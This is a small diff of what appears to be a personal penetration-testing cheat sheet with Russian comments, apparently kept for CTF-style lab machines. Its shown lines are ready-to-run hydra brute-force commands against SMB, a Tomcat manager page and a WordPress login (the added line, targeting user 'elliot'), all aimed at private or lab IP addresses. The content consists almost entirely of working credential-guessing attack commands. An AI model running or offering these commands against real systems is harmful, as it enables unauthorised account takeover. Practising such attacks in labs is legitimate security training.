@@ -28,7 +28,7 @@ hydra -x 7:8:1 -l administrator smb://192.168.50.200 -m "ROOT.DC" -V
 
 hydra -C tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html/   (перебор ВЕБ паролей)
 
-
+hydra -vV -l elliot -P pass.txt 192.168.50.123 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'    ---(Последнее из BURPA)
 
 # Перебор хешей по словарю и брут
 
